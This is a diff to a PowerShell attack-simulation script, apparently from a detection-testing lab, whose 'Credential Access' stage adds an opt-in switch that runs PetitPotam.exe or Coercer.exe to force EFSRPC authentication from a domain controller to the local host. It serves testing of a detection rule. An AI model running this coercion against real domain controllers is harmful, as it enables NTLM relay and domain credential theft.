@@ -14,10 +14,12 @@
     PowerShell opens the SMB named pipes it rides on (efsrpc/lsarpc), which still
     generates MSRPC traffic to the DC. Drop PetitPotam.exe in scripts\tools\.
 #>
-param([switch]$DryRun)
+param([switch]$DryRun,[switch]$EnableRealExploits)
 . "$PSScriptRoot\..\config\lab-config.ps1"
+. "$PSScriptRoot\_exploit.ps1"
 $cfg = $Global:EalDemo
 if ($DryRun) { $cfg.DryRun = $true }
+if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }
 
 $dc = $cfg.DomainController
 Write-Stage "STAGE 4 (Credential Access): EFSRPC named-pipe access to DC $dc" "INFO"
@@ -34,4 +36,12 @@ foreach ($p in @("IPC$", "pipe\efsrpc", "pipe\lsarpc")) {
 $helper = Join-Path $PSScriptRoot "tools\PetitPotam.exe"
 if (Test-Path $helper) { Write-Stage "  PetitPotam found - exact coercion: $helper <listener> $dc" "INFO" }
 else { Write-Stage "  (For the exact EFSRPC coercion, place PetitPotam.exe in scripts\tools\)" "INFO" }
+
+# Opt-in: fire the exact EFSRPC coercion via an operator-supplied tool.
+# PetitPotam.exe <listener> <target>  (listener = this host, target = the DC).
+Invoke-RealExploit -Name 'EFSRPC/PetitPotam coercion' `
+    -ToolCandidates @('PetitPotam.exe','petitpotam.exe','Coercer.exe') `
+    -TrafficNote 'SMB named-pipe traffic to the DC was sent.' `
+    -Run { param($t) & $t $env:COMPUTERNAME $cfg.DomainController }
+
 Write-Stage "STAGE 4 done. Expect EAL: 'Suspicious EFSRPC to domain controller' (rule 82a37634)." "OK"
